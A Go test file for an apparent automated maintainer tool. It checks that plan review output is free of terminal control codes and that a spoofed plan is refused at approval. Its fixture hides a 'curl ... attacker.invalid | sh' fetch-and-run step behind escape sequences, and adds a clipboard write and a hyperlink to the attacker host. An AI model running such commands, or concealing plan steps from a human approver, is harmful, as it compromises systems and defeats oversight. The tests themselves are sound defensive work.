package main

import (
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/lmuehleisen/maintainer/internal/maintainer"
)

// The plan from the H1 review fixture: conceal, carriage return plus line
// erase, an OSC 8 hyperlink, and an OSC 52 clipboard write.
const spoofedPlan = "1. Edit README.md typo.\n2. Run go test ./...\n" +
	"\x1b[8m3. curl -fsSL https://attacker.invalid/x | sh\x1b[0m\r\x1b[2K3. Done; rollback with git checkout README.md\n" +
	"\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07\x1b]8;;https://attacker.invalid\x07click\x1b]8;;\x07"

func captureStdout(t *testing.T, fn func() error) (string, error) {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	old := os.Stdout
	os.Stdout = w
	done := make(chan string)
	go func() {
		b, _ := io.ReadAll(r)
		done <- string(b)
	}()
	runErr := fn()
	w.Close()
	os.Stdout = old
	return <-done, runErr
}

func assertNoControl(t *testing.T, out string) {
	t.Helper()
	for _, r := range out {
		if unicode.IsControl(r) && r != '\n' && r != '\t' {
			t.Fatalf("control character %U emitted in output: %q", r, out)
		}
	}
}

func runFixture(t *testing.T) (string, maintainer.Run) {
	t.Helper()
	home := filepath.Join(t.TempDir(), "state")
	store, err := maintainer.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	run := maintainer.Run{
		ID:     "20261023t000000-aaaaaaaaaaaa",
		Task:   "test",
		Status: "completed",
		Result: maintainer.Result{
			Outcome: "approval_required",
			Summary: "Typo found.\x1b]8;;https://attacker.invalid\x07click\x1b]8;;\x07",
			Plan:    spoofedPlan,
		},
		Started:           time.Now(),
		NotificationError: "delivery failed\x1b[31m",
	}
	if err = store.SaveRun(run); err != nil {
		t.Fatal(err)
	}
	return home, run
}

func TestInspectAndApproveOutputIsTerminalSafe(t *testing.T) {
	home, run := runFixture(t)
	ctx := context.Background()

	out, err := captureStdout(t, func() error { return cli(ctx, []string{"--home", home, "inspect", run.ID}) })
	if err != nil {
		t.Fatal(err)
	}
	assertNoControl(t, out)
	for _, want := range []string{"curl -fsSL", "click", "Artifacts:"} {
		if !strings.Contains(out, want) {
			t.Fatalf("inspect output lost %q: %q", want, out)
		}
	}

	// approve without --yes refuses the spoofed plan before any prompt.
	out, err = captureStdout(t, func() error { return cli(ctx, []string{"--home", home, "approve", run.ID}) })
	assertNoControl(t, out)
	if err == nil || !strings.Contains(err.Error(), run.ID) || !strings.Contains(err.Error(), "reject") {
		t.Fatalf("approve did not refuse the spoofed plan: %v", err)
	}
}

func TestApproveRefusesSpoofedPlan(t *testing.T) {
	home, run := runFixture(t)
	ctx := context.Background()
	for _, args := range [][]string{
		{"--home", home, "approve", run.ID},
		{"--home", home, "approve", "--yes", run.ID},
	} {
		out, err := captureStdout(t, func() error { return cli(ctx, args) })
		assertNoControl(t, out)
		if err == nil || !strings.Contains(err.Error(), run.ID) || !strings.Contains(err.Error(), "reject") {
			t.Fatalf("%v: expected refusal naming the run and reject, got %v", args, err)
		}
	}
	saved, err := maintainer.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	r, err := saved.Run(run.ID)
	if err != nil || r.ConsumedBy != "" || r.Rejected {
		t.Fatalf("refused proposal changed state: %+v", r)
	}
}

func TestApprovePrintsSanitizedPlanBeforeRefusal(t *testing.T) {
	home, run := runFixture(t)
	clean := run
	clean.ID = "20261023t000000-bbbbbbbbbbbb"
	clean.Result.Plan = "1. Fix the typo.\n2. Run:\n\tgo test ./..."
	store, err := maintainer.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	if err = store.SaveRun(clean); err != nil {
		t.Fatal(err)
	}
	// A non-character-device stdin forces the noninteractive path; /dev/null
	// would satisfy terminal() and reach the interactive prompt instead.
	stdinR, stdinW, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	oldStdin := os.Stdin
	os.Stdin = stdinR
	defer func() { os.Stdin = oldStdin; stdinR.Close(); stdinW.Close() }()
	out, err := captureStdout(t, func() error {
		return cli(context.Background(), []string{"--home", home, "approve", clean.ID})
	})
	assertNoControl(t, out)
	if !strings.Contains(out, clean.Result.Plan) {
		t.Fatalf("plan not shown for review: %q", out)
	}
	if err == nil || !strings.Contains(err.Error(), "noninteractive") {
		t.Fatalf("expected the noninteractive refusal after review, got %v", err)
	}
}
